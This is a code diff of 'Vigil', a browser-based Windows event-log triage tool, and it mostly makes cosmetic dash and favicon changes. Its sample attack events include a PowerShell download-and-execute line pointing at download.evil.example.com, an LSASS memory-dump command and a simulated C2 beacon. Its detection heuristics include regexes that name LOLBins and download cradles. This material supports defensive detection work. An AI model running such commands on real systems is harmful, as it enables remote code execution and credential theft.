@@ -3,7 +3,8 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Vigil — event-log triage</title>
+<title>Vigil - event-log triage</title>
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg%20xmlns%3D'http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg'%20viewBox%3D'0%200%2064%2064'%3E%3Crect%20width%3D'64'%20height%3D'64'%20rx%3D'14'%20fill%3D'%231f5fbf'%2F%3E%3Cpath%20d%3D'M17%2019%20L32%2047%20L47%2019'%20fill%3D'none'%20stroke%3D'%23ffffff'%20stroke-width%3D'7'%20stroke-linecap%3D'round'%20stroke-linejoin%3D'round'%2F%3E%3C%2Fsvg%3E">
 <style>
   :root{
     --bg:#080b11; --panel:#0e141d; --panel-2:#111a24; --line:#1c2733; --line-2:#26323f;
@@ -685,7 +686,7 @@
     <button class="btn" id="rulesBtn">⚑ Rules</button>
     <div class="pop" id="rulesPop" style="left:auto;right:0">
       <div class="pophead"><span>Detection rules</span><span id="rulesCounts"></span></div>
-      <div class="aanote" style="margin:2px 6px 6px">Built-in behavioral heuristics run automatically. Well-known SigmaHQ rules are fetched <b>online</b> on first load (nothing is bundled). YARA here is a lightweight subset (strings, regex, hex, counts) — not full libyara. Everything runs in your browser.</div>
+      <div class="aanote" style="margin:2px 6px 6px">Built-in behavioral heuristics run automatically. Well-known SigmaHQ rules are fetched <b>online</b> on first load (nothing is bundled). YARA here is a lightweight subset (strings, regex, hex, counts) - not full libyara. Everything runs in your browser.</div>
       <div class="rrow" style="margin:2px 6px 6px"><button class="btn primary" id="loadDefaultBtn" style="font-size:11px">⟳ Load well-known SigmaHQ rules (online)</button></div>
 
       <div class="rsec">
@@ -706,7 +707,7 @@
 
       <div class="rsec">
         <div class="pophead"><span>Local rules folder</span></div>
-        <div class="aanote" style="margin:4px 6px">Point at a folder of Sigma <b>.yml</b> / YARA <b>.yar</b> files — e.g. your Hayabusa <b>rules/</b> directory. The browser will ask you to pick the folder (it can't read a typed path for security reasons). Files are read locally and never uploaded. Subfolders are included.</div>
+        <div class="aanote" style="margin:4px 6px">Point at a folder of Sigma <b>.yml</b> / YARA <b>.yar</b> files - e.g. your Hayabusa <b>rules/</b> directory. The browser will ask you to pick the folder (it can't read a typed path for security reasons). Files are read locally and never uploaded. Subfolders are included.</div>
         <input type="file" id="ruleDir" webkitdirectory directory multiple hidden>
         <div class="rrow"><button class="btn primary" id="ruleDirBtn" style="font-size:11px">📁 Choose rules folder…</button></div>
       </div>
@@ -742,7 +743,7 @@
       <h4 class="set-h">✦ AI Support</h4>
       <p class="set-note">Pick a model, paste its API key, and Save. AI Support then works from every section
         (Dashboard, Case Notes, Detections…). Keys are stored server-side (git-ignored) and never sent to the browser.
-        Analysis sends a summary of the selected data to your chosen provider — use only on data you may share.</p>
+        Analysis sends a summary of the selected data to your chosen provider - use only on data you may share.</p>
       <div class="ai-prov" id="aiProvPick">
         <button class="ai-pbtn" data-aiprov="anthropic">Claude <span class="set-tag" id="aiS-anthropic">not set</span></button>
         <button class="ai-pbtn" data-aiprov="openai">ChatGPT <span class="set-tag" id="aiS-openai">not set</span></button>
@@ -764,11 +765,11 @@
         Lookups send the indicator to the provider and are cached for 24h.</p>
       <label class="set-row"><span>AbuseIPDB API key <span class="set-tag" id="abStatus">not set</span></span>
         <input type="password" id="abKey" placeholder="paste AbuseIPDB key (IP reputation)" autocomplete="off"></label>
-      <div class="set-hint">Free key: <span class="ext-link" data-ext="https://www.abuseipdb.com/account/api">abuseipdb.com/account/api</span> — used for IP abuse score, ISP, Tor.</div>
+      <div class="set-hint">Free key: <span class="ext-link" data-ext="https://www.abuseipdb.com/account/api">abuseipdb.com/account/api</span> - used for IP abuse score, ISP, Tor.</div>
       <label class="set-row"><span>VirusTotal API key <span class="set-tag" id="vtStatus">not set</span></span>
         <input type="password" id="vtKey" placeholder="paste VirusTotal v3 key (IP + hash)" autocomplete="off"></label>
-      <div class="set-hint">Free key: <span class="ext-link" data-ext="https://www.virustotal.com/gui/my-apikey">virustotal.com/gui/my-apikey</span> — used for IP reputation and file-hash detections.</div>
-      <p class="set-note" style="color:var(--yellow,#e6b450)">⚠ Enrichment makes outbound requests to third parties — only enable on data you're permitted to share externally.</p>
+      <div class="set-hint">Free key: <span class="ext-link" data-ext="https://www.virustotal.com/gui/my-apikey">virustotal.com/gui/my-apikey</span> - used for IP reputation and file-hash detections.</div>
+      <p class="set-note" style="color:var(--yellow,#e6b450)">⚠ Enrichment makes outbound requests to third parties - only enable on data you're permitted to share externally.</p>
       <div class="set-acts">
         <button class="vbtn" id="settingsSave">Save keys</button>
         <button class="vbtn" id="settingsClear">Clear all keys</button>
@@ -778,7 +779,7 @@
   </div>
 </div>
 
-<button id="aiFab" class="hide" title="AI Support — analyse this section">✦ AI Support</button>
+<button id="aiFab" class="hide" title="AI Support - analyse this section">✦ AI Support</button>
 <div id="aiPanel">
   <div class="aip-head"><span id="aiPanelTitle">✦ AI Support</span><span class="aip-prov" id="aiPanelProv"></span><span class="aip-x" id="aiPanelClose">✕</span></div>
   <div class="aip-body" id="aiPanelBody"></div>
@@ -900,7 +901,7 @@
 
 </script>
 <script>
-/* winevtx — in-browser .evtx parser (bundled) */
+/* winevtx - in-browser .evtx parser (bundled) */
 if(typeof process==="undefined"){var process={env:{}};}
 var WinEvtx = (() => {
   var __create = Object.create;
@@ -3577,12 +3578,12 @@ buffer/index.js:
 <script>
 /* detection engine (Sigma + YARA-lite + heuristics + Aho-Corasick index) */
 /* ============================================================================
-   EVTX Triage — Detection Engine
+   EVTX Triage - Detection Engine
    Self-contained. Works in browser (inlined) and Node (module.exports at end).
    Three layers:
-     1. Heuristics  — behavioral, always-on, no rules required
-     2. Sigma       — common detection subset + Windows field mapping
-     3. YARA-lite   — string/regex/hex matching over each record's raw text
+     1. Heuristics  - behavioral, always-on, no rules required
+     2. Sigma       - common detection subset + Windows field mapping
+     3. YARA-lite   - string/regex/hex matching over each record's raw text
    Designed for recall + clarity over spec-completeness; unsupported constructs
    are skipped explicitly (never silently mis-evaluated).
    ========================================================================== */
@@ -4006,7 +4007,7 @@ function compileYaraCondition(cond, ids){
   return orE();
 }
 
-/* ----------------- COMMAND-LINE ARTIFACT EXTRACTION (inlined — keep in sync with engine.cjs) */
+/* ----------------- COMMAND-LINE ARTIFACT EXTRACTION (inlined - keep in sync with engine.cjs) */
 function parseProcessArtifacts(cmd){
   const out={ accounts:[], groups:[], tasks:[], services:[] };
   if(!cmd) return out; const s=String(cmd); let m;
@@ -4024,7 +4025,7 @@ function parseProcessArtifacts(cmd){
   return out;
 }
 
-/* ----------------- MITRE ATT&CK (inlined copy — keep in sync with engine.cjs) --- */
+/* ----------------- MITRE ATT&CK (inlined copy - keep in sync with engine.cjs) --- */
 const ATTACK_TACTIC_NAMES={
   "reconnaissance":"Reconnaissance","resource-development":"Resource Development","initial-access":"Initial Access",
   "execution":"Execution","persistence":"Persistence","privilege-escalation":"Privilege Escalation",
@@ -4081,7 +4082,7 @@ function parseAttack(tags){
   return { techniques, tactics:[...tacSet] };
 }
 
-/* ----------------- ENTITY RISK SCORING (inlined — keep in sync with engine.cjs) - */
+/* ----------------- ENTITY RISK SCORING (inlined - keep in sync with engine.cjs) - */
 const SEV_RANK={critical:4,high:3,medium:2,low:1,informational:0,info:0};
 function sevRank(l){ const n=SEV_RANK[String(l||"").toLowerCase()]; return n==null?2:n; }
 const SEV_WEIGHT={critical:100,high:40,medium:12,low:4,informational:1,info:1};
@@ -4114,7 +4115,7 @@ function makeEntityScorer(){
       arr.sort((a,b)=> b.score-a.score || sevRank(b.level)-sevRank(a.level) || b.hits-a.hits); return topN?arr.slice(0,topN):arr; }
   };
 }
-/* ATTACK-CHAIN CORRELATION (inlined — keep in sync with engine.cjs) */
+/* ATTACK-CHAIN CORRELATION (inlined - keep in sync with engine.cjs) */
 function buildAttackChains(items, opts){
   opts=opts||{}; const GAP=opts.gapMs||30*60*1000, MAX_SPAN=opts.maxSpanMs||24*60*60*1000, MIN_TACTICS=opts.minTactics||2, MAX_CHAINS=opts.maxChains||40;
   const byHost=new Map();
@@ -4184,7 +4185,7 @@ function runHeuristics(rows){
   for (let i=0;i<rows.length;i++){ const e=Number(rows[i].eventId); if(!byEid.has(e))byEid.set(e,[]); byEid.get(e).push(i); }
 
   for (const e of [1102,104]) for (const i of (byEid.get(e)||[]))
-    add(i,"H-LOGCLEAR","Security/event log cleared","high","EventID "+e+" — audit-log clearing, classic anti-forensics");
+    add(i,"H-LOGCLEAR","Security/event log cleared","high","EventID "+e+" - audit-log clearing, classic anti-forensics");
 
   const fails=(byEid.get(4625)||[]);
   if (fails.length){
@@ -4194,7 +4195,7 @@ function runHeuristics(rows){
       if(!ipUsers.has(ip))ipUsers.set(ip,new Set()); ipUsers.get(ip).add(u); }
     for (const [ip,arr] of byIp){ if(arr.length>=10){ const ext=!isPrivateIp(ip);
       for (const i of arr) add(i,"H-BRUTE","Failed-logon burst (possible brute force)",ext?"high":"medium",
-        arr.length+" failed logons (4625) from "+ip+(ext?" — external source":"")); } }
+        arr.length+" failed logons (4625) from "+ip+(ext?" - external source":"")); } }
     for (const [ip,set] of ipUsers){ if(set.size>=8&&ip!=="?"){
       for (const i of fails){ if(((rows[i].data||{}).IpAddress||"?")===ip) add(i,"H-SPRAY","Password-spray pattern","high",ip+" hit "+set.size+" distinct accounts"); } } }
   }
@@ -4214,12 +4215,12 @@ function runHeuristics(rows){
     if(ip&&!isPrivateIp(ip)) add(i,"H-EXTRDP","RDP authentication from external IP","medium","Source "+ip); }
 
   for (const i of (byEid.get(4720)||[])){ const u=(rows[i].data||{}).TargetUserName;
-    add(i,"H-NEWUSER","New user account created","medium","Account '"+(u||"?")+"' created (4720) — verify it is authorized"); }
+    add(i,"H-NEWUSER","New user account created","medium","Account '"+(u||"?")+"' created (4720) - verify it is authorized"); }
   for (const e of [4732,4728,4756]) for (const i of (byEid.get(e)||[]))
-    add(i,"H-ADMINADD","Member added to privileged group","high","Membership change ("+e+") — confirm target group");
+    add(i,"H-ADMINADD","Member added to privileged group","high","Membership change ("+e+") - confirm target group");
 
   for (const e of [1006,1015,1116]) for (const i of (byEid.get(e)||[])) add(i,"H-AVHIT","Defender detected malware","high","Defender event "+e);
-  for (const e of [5001,1117]) for (const i of (byEid.get(e)||[])) add(i,"H-AVOFF","Defender protection change / action","high","Defender event "+e+" — protection may be disabled");
+  for (const e of [5001,1117]) for (const i of (byEid.get(e)||[])) add(i,"H-AVOFF","Defender protection change / action","high","Defender event "+e+" - protection may be disabled");
 
   const tgs=(byEid.get(4769)||[]); const rc4=[];
   for (const i of tgs){ const enc=String((rows[i].data||{}).TicketEncryptionType||(rows[i].data||{}).EncryptionType||""); if(/0x17|rc4/i.test(enc))rc4.push(i); }
@@ -4229,7 +4230,7 @@ function runHeuristics(rows){
   for (const i of (byEid.get(4662)||[])){ const d=rows[i].data||{};
     const props=String(d.Properties||d.AccessMaskString||d.ObjectType||""); const subj=String(d.SubjectUserName||"");
     if (REPL_GUID.test(props) && subj && !/\$$/.test(subj))
-      add(i,"H-DCSYNC","Directory replication rights used (possible DCSync)","critical","'"+subj+"' exercised AD replication (4662) — DCSync credential theft"); }
+      add(i,"H-DCSYNC","Directory replication rights used (possible DCSync)","critical","'"+subj+"' exercised AD replication (4662) - DCSync credential theft"); }
   for (const i of (byEid.get(10)||[])){ const d=rows[i].data||{}; const tgt=String(d.TargetImage||"");
     if (/\\lsass\.exe$/i.test(tgt)){ const ga=String(d.GrantedAccess||"").toLowerCase();
       if (/0x1010|0x1410|0x1438|0x143a|0x1fffff|0x1f1fff|0x1f3fff/.test(ga))
@@ -4237,12 +4238,12 @@ function runHeuristics(rows){
   for (const e of [7045,4697]) for (const i of (byEid.get(e)||[])){ const d=rows[i].data||{};
     const blob=String(d.ServiceName||d.param1||"")+" "+String(d.ImagePath||d.ServiceFileName||"");
     if (/psexe|paexec|csexec|remcom|xcmd/i.test(blob))
-      add(i,"H-PSEXEC","PsExec-style remote service execution","high","Service '"+String(d.ServiceName||d.param1||"?")+"' — remote exec tool"); }
+      add(i,"H-PSEXEC","PsExec-style remote service execution","high","Service '"+String(d.ServiceName||d.param1||"?")+"' - remote exec tool"); }
   for (const i of (byEid.get(5145)||[])){ const d=rows[i].data||{}; const rel=String(d.RelativeTargetName||d.ShareName||"");
-    if (/psexesvc|paexec|remcom/i.test(rel)) add(i,"H-PSEXEC","PsExec named-pipe / share access","high","Access to '"+rel+"' — PsExec lateral movement"); }
+    if (/psexesvc|paexec|remcom/i.test(rel)) add(i,"H-PSEXEC","PsExec named-pipe / share access","high","Access to '"+rel+"' - PsExec lateral movement"); }
   for (const i of (byEid.get(4624)||[])){ const d=rows[i].data||{};
     if (String(d.LogonType)==="9" && /seclogo/i.test(String(d.LogonProcessName||"")))
-      add(i,"H-PTH","NewCredentials logon (overpass-the-hash / runas /netonly)","medium","Type-9 logon by '"+String(d.TargetUserName||"?")+"' — alternate credentials used"); }
+      add(i,"H-PTH","NewCredentials logon (overpass-the-hash / runas /netonly)","medium","Type-9 logon by '"+String(d.TargetUserName||"?")+"' - alternate credentials used"); }
   const SCHT_SUSP=/powershell|pwsh|cmd\.exe|wscript|cscript|mshta|rundll32|regsvr32|certutil|bitsadmin|\\temp\\|\\appdata\\|programdata|-enc|downloadstring|frombase64|https?:\/\//i;
   for (const i of (byEid.get(4698)||[])){ const d=rows[i].data||{};
     const xml=String(d.TaskContent||d.TaskContentNew||d.NewTaskContent||""), nm=String(d.TaskName||"");
@@ -4481,7 +4482,7 @@ function showBinaryNotice(reason){
     '<p>'+(reason?esc(reason)+'. ':'')+'This tool parses <b>.evtx</b> natively, but if the file is truncated or an unusual variant you can convert it to <b>JSONL</b> and load that:</p>'+
     '<div style="text-align:left;font-family:var(--mono);font-size:11.5px;color:var(--txt);background:var(--bg);'+
     'border:1px solid var(--line-2);border-radius:8px;padding:12px 14px;margin:12px auto;max-width:680px;line-height:1.9">'+
-    '<div style="color:var(--accent)"># Hayabusa — also emits a ready detection timeline</div>'+
+    '<div style="color:var(--accent)"># Hayabusa - also emits a ready detection timeline</div>'+
     'hayabusa json-timeline -d .\\logs -o timeline.jsonl -J<br><br>'+
     '<div style="color:var(--accent)"># evtx_dump (omerbenamram)</div>'+
     'evtx_dump -o jsonl Security.evtx &gt; Security.jsonl<br><br>'+
@@ -4766,7 +4767,7 @@ function applyFilter(){
   renderHead(); updateStats(); scroller.scrollTop=0; render();
 }
 function updateStats(){
-  const span=(tsMin&&tsMax)?(tsMin.slice(0,19).replace("T"," ")+" → "+tsMax.slice(0,19).replace("T"," ")):"—";
+  const span=(tsMin&&tsMax)?(tsMin.slice(0,19).replace("T"," ")+" → "+tsMax.slice(0,19).replace("T"," ")):"-";
   if(SCROLL){
     $("stats").innerHTML='<b>'+filtered.length.toLocaleString()+'</b><span class="x"> / '+Math.max(0,gridEventTotal()-catCount).toLocaleString()+
       ' events</span><span class="x">  ·  </span>'+span;
@@ -4803,7 +4804,7 @@ function render(){
   for(let i=start;i<end;i++){
     const fi=filtered[i], r=getRow(fi), gid=fi+rowBase, top=HEADH+i*ROWH, fl=flagged.has(gid);
     const ann=annotations.get(gid);
-    html+='<div class="r'+(i&1?" odd":"")+(fl?" flagged":"")+(ann&&ann.verdict?" av-"+ann.verdict:"")+'" data-i="'+i+'" style="top:'+top+'px;width:'+W+'px" title="'+(ann?"analyst: "+esc(ann.verdict||"noted")+(ann.note?" — "+esc(ann.note):""):"")+'">';
+    html+='<div class="r'+(i&1?" odd":"")+(fl?" flagged":"")+(ann&&ann.verdict?" av-"+ann.verdict:"")+'" data-i="'+i+'" style="top:'+top+'px;width:'+W+'px" title="'+(ann?"analyst: "+esc(ann.verdict||"noted")+(ann.note?" - "+esc(ann.note):""):"")+'">';
     html+='<div class="c star'+(fl?" on":"")+'" style="width:'+STARW+'px">'+(fl?"★":"☆")+'</div>';
     for(const id of view){
       if(id==="det"){ const dc=getDef("det"); let inner="",ttl="";
@@ -4880,7 +4881,7 @@ function toggleFlag(g){
   if(flagged.has(gi))flagged.delete(gi); else flagged.add(gi);
   updateFlaggedBtn();
   if(showFlaggedOnly) applyFilter(); else render();
-  saveFlagsLocal();            // instant, synchronous — survives refresh no matter what
+  saveFlagsLocal();            // instant, synchronous - survives refresh no matter what
   saveFlagsToServer();         // shared/persistent across browsers
 }
 let flagsSaveTimer=null, flagsDirty=false;
@@ -4925,7 +4926,7 @@ function syntaxHighlight(json){
       return '<span class="'+cls+'">'+esc(m)+'</span>'; });
 }
 // Render multi-line / long text fields (PowerShell ScriptBlockText, command lines) as
-// readable vertical blocks — real line breaks and wrapping instead of one squished row.
+// readable vertical blocks - real line breaks and wrapping instead of one squished row.
 const READABLE_FIELDS=["ScriptBlockText","CommandLine","ParentCommandLine","Payload","Message","Details"];
 function readablePanels(d){
   if(!d||typeof d!=="object")return "";
@@ -4948,7 +4949,7 @@ function openDetail(r){
     for(const h of dets){
       const pa=DetEngine.parseAttack(h.tags);
       let att=""; for(const t of pa.techniques){ const nm=t.name&&t.name!==t.id?t.name:"";
-        att+=' <span class="mdet-att" title="'+esc(t.id+(nm?" — "+nm:""))+'">'+esc(t.id)+'</span>'; }
+        att+=' <span class="mdet-att" title="'+esc(t.id+(nm?" - "+nm:""))+'">'+esc(t.id)+'</span>'; }
       dh+='<div class="mdet-i"><span class="ddot" style="background:'+numColor(sevNum(h.level))+'"></span>'+
       '<span class="mdet-src '+esc(h.source)+'">'+esc(h.source)+'·'+esc(h.level)+'</span> <b>'+esc(h.title||h.ruleId)+'</b>'+att+
       (h.why?'<div class="mdet-why">'+esc(h.why)+'</div>':'')+'</div>'; }
@@ -5053,7 +5054,7 @@ function uploadWithProgress(url, formData, label){
     showProgress(true); setProgressPct(0, (label||"uploading")+"…");
     const xhr=new XMLHttpRequest(); xhr.open("POST", url, true);
     xhr.upload.onprogress=e=>{ if(e.lengthComputable){ const pct=e.loaded/e.total*100;
-      setProgressPct(pct, (label||"uploading")+" — "+fmtBytes(e.loaded)+" / "+fmtBytes(e.total)+"  ("+pct.toFixed(0)+"%)"); } };
+      setProgressPct(pct, (label||"uploading")+" - "+fmtBytes(e.loaded)+" / "+fmtBytes(e.total)+"  ("+pct.toFixed(0)+"%)"); } };
     xhr.upload.onload=()=>{ $("progress").classList.add("indet"); setProgressPct(100, "parsing & indexing on server…"); };
     xhr.onload=()=>{ $("progress").classList.remove("indet");
       if(xhr.status>=200&&xhr.status<300){ try{ resolve(JSON.parse(xhr.responseText)); }catch(e){ reject(new Error("bad server response")); } }
@@ -5143,7 +5144,7 @@ function buildSampleEvents(){
   ps.push(ev(PS,PSP,4104,WS,"Microsoft-Windows-PowerShell/Operational",{ScriptBlockText:"IEX (New-Object Net.WebClient).DownloadString('http://download.evil.example.com/p.ps1')",Path:""},402));
   ps.push(ev(PS,PSP,4104,WS,"Microsoft-Windows-PowerShell/Operational",{ScriptBlockText:"$d=[Convert]::FromBase64String($e); [Reflection.Assembly]::Load($d)",Path:""},403));
   ps.push(ev(PS,PSP,4104,WS,"Microsoft-Windows-PowerShell/Operational",{ScriptBlockText:"Get-Process lsass | Out-Minidump -DumpFilePath C:\\Temp",Path:""},418));
-  // --- Firewall sample (pfSense-style) — kept in the Firewall section; correlates with the same attacker IP / C2 ---
+  // --- Firewall sample (pfSense-style) - kept in the Firewall section; correlates with the same attacker IP / C2 ---
   const FW="pfSense-firewall.log", VPN="OpenVPN-vpn.log";
   const fwe=(data,t)=>({ _src:FW, _cat:"firewall", Event:{ System:{ Provider:{Name:"Firewall"}, EventID:"", Computer:"pfSense", Channel:FW,
     TimeCreated:{ SystemTime: at(t) } }, EventData:data } });
@@ -5156,7 +5157,7 @@ function buildSampleEvents(){
   for(let i=0;i<5;i++) fw.push(fwe({Action:"block",Interface:"WAN",Protocol:"TCP",SourceIP:ATT,SourcePort:String(40000+i*7),DestIP:"10.0.0.5",DestPort:String([135,139,445,3389,5985][i]),Rule:"Default deny (WAN)",Message:"block in WAN TCP "+ATT+":"+(40000+i*7)+" -> 10.0.0.5:"+[135,139,445,3389,5985][i]+" [Default deny]"},288+i));
   // blocked inbound RDP brute-force bursts
   for(let i=0;i<4;i++) fw.push(fwe({Action:"block",Interface:"WAN",Protocol:"TCP",SourceIP:ATT,SourcePort:String(53400+i*3),DestIP:"10.0.0.5",DestPort:"3389",Rule:"Default deny (WAN)",Message:"block in WAN TCP "+ATT+":"+(53400+i*3)+" -> 10.0.0.5:3389 (RDP) [Default deny]"},300+i*4));
-  // allowed outbound C2 (beacon) — the firewall let this through
+  // allowed outbound C2 (beacon) - the firewall let this through
   fw.push(fwe({Action:"pass",Interface:"WAN",Protocol:"TCP",SourceIP:"10.0.0.77",SourcePort:"49733",DestIP:ATT,DestPort:"443",DestHost:"c2.evil.example.com",Rule:"Allow LAN to any",Message:"pass out WAN TCP 10.0.0.77:49733 -> "+ATT+":443 (c2.evil.example.com) [Allow LAN to any]"},410));
   fw.push(fwe({Action:"pass",Interface:"WAN",Protocol:"UDP",SourceIP:"10.0.0.77",SourcePort:"51888",DestIP:"10.0.0.1",DestPort:"53",Query:"c2.evil.example.com",Message:"pass out WAN UDP 10.0.0.77:51888 -> 10.0.0.1:53 (DNS c2.evil.example.com)"},411));
   // blocked inbound SMB toward the file server
@@ -5217,11 +5218,11 @@ function applyTheme(t){ document.body.classList.toggle("light", t==="light");
 $("themeBtn").onclick=()=>applyTheme(document.body.classList.contains("light")?"dark":"light");
 const VIGIL_BUILD="2026-06-25 · flags+localStorage";
 try{ console.log("%cVigil","color:#3ad6a0;font-weight:bold","build "+VIGIL_BUILD); }catch(_){}
-{ const lg=document.querySelector(".logo,#logo,header .brand"); if(lg) lg.setAttribute("title","Vigil — build "+VIGIL_BUILD); }
+{ const lg=document.querySelector(".logo,#logo,header .brand"); if(lg) lg.setAttribute("title","Vigil - build "+VIGIL_BUILD); }
 serverInit();
 
 /* =====================  DASHBOARD  ===================== */
-/* EventID knowledge base — severity s: 0 info · 1 notice · 2 suspicious · 3 high */
+/* EventID knowledge base - severity s: 0 info · 1 notice · 2 suspicious · 3 high */
 const GENERIC={
  104:{d:"Event log was cleared (anti-forensics)",s:3},
  1100:{d:"Event Log service was shut down",s:1},
@@ -5243,7 +5244,7 @@ const GENERIC={
  4672:{d:"Special privileges assigned to logon (admin)",s:1},
  4673:{d:"Privileged service was called",s:1},
  4674:{d:"Operation on a privileged object",s:1},
- 4688:{d:"New process created — review command line",s:1},
+ 4688:{d:"New process created - review command line",s:1},
  4689:{d:"Process exited",s:0},
  4697:{d:"Service installed via Security log (persistence)",s:2},
  4698:{d:"Scheduled task created (persistence)",s:2},
@@ -5296,7 +5297,7 @@ const SYSMON={
  1:{d:"Sysmon: process created",s:1},2:{d:"Sysmon: file creation time changed (timestomp)",s:2},
  3:{d:"Sysmon: network connection",s:1},5:{d:"Sysmon: process terminated",s:0},
  7:{d:"Sysmon: image/DLL loaded",s:1},8:{d:"Sysmon: CreateRemoteThread (code injection)",s:3},
- 9:{d:"Sysmon: raw disk access",s:2},10:{d:"Sysmon: process access — LSASS ⇒ credential dumping",s:3},
+ 9:{d:"Sysmon: raw disk access",s:2},10:{d:"Sysmon: process access - LSASS ⇒ credential dumping",s:3},
  11:{d:"Sysmon: file created",s:1},12:{d:"Sysmon: registry key created/deleted",s:1},
  13:{d:"Sysmon: registry value set",s:1},14:{d:"Sysmon: registry key/value renamed",s:1},
  15:{d:"Sysmon: alternate data stream created",s:2},17:{d:"Sysmon: named pipe created",s:1},
@@ -5306,7 +5307,7 @@ const SYSMON={
 const PWSH={
  400:{d:"PowerShell engine started",s:1},403:{d:"PowerShell engine stopped",s:0},
  600:{d:"PowerShell provider started",s:0},800:{d:"PowerShell pipeline execution",s:1},
- 4103:{d:"PowerShell module logging",s:1},4104:{d:"PowerShell script block — inspect for obfuscation",s:2},
+ 4103:{d:"PowerShell module logging",s:1},4104:{d:"PowerShell script block - inspect for obfuscation",s:2},
  4105:{d:"PowerShell script start",s:0},4106:{d:"PowerShell script stop",s:0}
 };
 const DEFENDER={
@@ -5364,7 +5365,7 @@ function computeDashboard(){
 }
 
 function statCard(v,k,cls){ return '<div class="card stat-card"><div class="v '+cls+'">'+v+'</div><div class="k">'+esc(k)+'</div></div>'; }
-function tsCard(ms,label){ if(ms==null||isNaN(ms)) return statCard("—",label,"");
+function tsCard(ms,label){ if(ms==null||isNaN(ms)) return statCard("-",label,"");
   const iso=new Date(ms).toISOString();
   return '<div class="card stat-card"><div class="v ts">'+iso.slice(0,10)+'<span class="ts-t">'+iso.slice(11,19)+' UTC</span></div><div class="k">'+esc(label)+'</div></div>'; }
 function barPanel(title,map,n,act){
@@ -5398,12 +5399,12 @@ function eidPanel(D){
   const arr=[...D.eids.entries()].sort((a,b)=>b[1].count-a[1].count).slice(0,25);
   let body="";
   for(const [eid,info] of arr){ let prov="",pc=0; for(const [p,c] of info.prov){ if(c>pc){pc=c;prov=p;} }
-    const m=describe(prov,eid)||{d:"—",s:0};
+    const m=describe(prov,eid)||{d:"-",s:0};
     body+='<tr data-act="eid" data-val="'+esc(eid)+'"><td class="eid-num">'+esc(eid)+'</td>'+
       '<td><span class="sev" style="background:'+sevColor(m.s)+'"></span>'+esc(m.d)+'</td>'+
       '<td style="color:var(--blue)">'+esc(prov)+'</td><td class="cnt">'+info.count.toLocaleString()+'</td></tr>';
   }
-  return '<div class="panel"><h3>Event IDs — counts &amp; meaning</h3>'+
+  return '<div class="panel"><h3>Event IDs - counts &amp; meaning</h3>'+
     '<table class="dt"><thead><tr><th>ID</th><th>Description</th><th>Provider</th><th style="text-align:right">Count</th></tr></thead><tbody>'+body+'</tbody></table>'+
     '<div class="legend"><span><span class="sev" style="background:'+sevColor(3)+'"></span>high</span>'+
     '<span><span class="sev" style="background:'+sevColor(2)+'"></span>suspicious</span>'+
@@ -5705,7 +5706,7 @@ function fullTimeline(fd){
     '<div class="tl-ax"><span>'+fmtTime(t0)+'</span><span>'+fmtTime(t1)+'</span></div></div>';
 }
 function renderFullDash(fd){
-  let h=reportBtns()+'<div class="dash-note">Full-log overview — all <b>'+(fd.total||0).toLocaleString()+'</b> events across the whole case '+
+  let h=reportBtns()+'<div class="dash-note">Full-log overview - all <b>'+(fd.total||0).toLocaleString()+'</b> events across the whole case '+
         '(Firewall/VPN have their own tabs). The Events grid streams the whole log in one continuous scroll.</div>';
   h+='<div id="dashSignals" class="sigwrap"><div class="dash-note" style="margin:0;padding:0">Scanning for threat signals…</div></div>';
   h+='<div class="cards">'+
@@ -5766,7 +5767,7 @@ async function loadDashSignals(){
 }
 function paintDashSignals(s){
   const host=$("dashSignals"); if(!host) return;
-  const intelSub = s.intelChecked ? (s.suspIntel?s.suspIntel+" suspicious · ":"")+s.intelChecked+" IOCs checked" : "none checked yet — see Watchlist";
+  const intelSub = s.intelChecked ? (s.suspIntel?s.suspIntel+" suspicious · ":"")+s.intelChecked+" IOCs checked" : "none checked yet - see Watchlist";
   const cards=[
     { n:s.malIntel,  label:"malicious IOC"+(s.malIntel===1?"":"s"), nav:"wl",             sub:intelSub },
     { n:s.suspAnc,   label:"suspicious ancestry",                   nav:"rar:parentChild", sub:"abnormal parent → child" },
@@ -5775,7 +5776,7 @@ function paintDashSignals(s){
     { n:s.antiF,     label:"anti-forensics",                        nav:"ev",              sub:"log clears + file deletes" },
     { n:s.tp,        label:"analyst TP"+(s.tp===1?"":"s"),          nav:"cw",              sub:"confirmed true positives", tone:"info" },
   ];
-  let h='<div class="sig-hd">🎯 Threat signals <span>— high-value findings across the case · click a lit card to pivot</span></div><div class="sigrow">';
+  let h='<div class="sig-hd">🎯 Threat signals <span>- high-value findings across the case · click a lit card to pivot</span></div><div class="sigrow">';
   for(const c of cards){
     const active=c.n>0; const cls=active?(c.tone==="info"?"sig-info":"sig-bad"):"sig-zero";
     h+='<button class="sigcard '+cls+'"'+(active?' data-sig="'+c.nav+'"':' disabled')+'>'+
@@ -5814,9 +5815,9 @@ function updateCatTabCounts(){
 function stripExt(n){ return String(n||"").replace(/\.(evtx|evt|jsonl?|ndjson|log|txt|csv|syslog)$/i,""); }
 /* ---------- Firewall / VPN dedicated sections ---------- */
 const CATINFO={ firewall:{label:"Firewall",icon:"🔥",wrap:"fwWrap",addId:"addFwFile",
-    blurb:"Firewall logs (pfSense, FortiGate, Palo Alto, iptables, Cisco ASA, syslog…). Added here, shown here — kept out of the main Events grid."},
+    blurb:"Firewall logs (pfSense, FortiGate, Palo Alto, iptables, Cisco ASA, syslog…). Added here, shown here - kept out of the main Events grid."},
   vpn:{label:"VPN",icon:"🔒",wrap:"vpnWrap",addId:"addVpnFile",
-    blurb:"VPN logs (OpenVPN, AnyConnect, WireGuard, GlobalProtect, IPsec…). Added here, shown here — kept out of the main Events grid."} };
+    blurb:"VPN logs (OpenVPN, AnyConnect, WireGuard, GlobalProtect, IPsec…). Added here, shown here - kept out of the main Events grid."} };
 function catRows(cat){ const out=[]; for(let i=0;i<rows.length;i++) if(rows[i].cat===cat) out.push(i); return out; }
 function renderCatSection(cat){
   if(SCROLL) return renderCatSectionScroll(cat);   // large case: pull the list from the server
@@ -5827,7 +5828,7 @@ function renderCatSection(cat){
   h+='<div class="dash-note">'+info.blurb+'</div>';
   if(!idxs.length){
     h+='<div class="cat-empty"><span class="big">'+info.icon+'</span>No '+info.label+' logs added yet.<br>'+
-       'Click <b>+ Add '+info.label+' log</b> above to import '+(cat==="vpn"?"a VPN":"a firewall")+' log — its events will appear here.</div>';
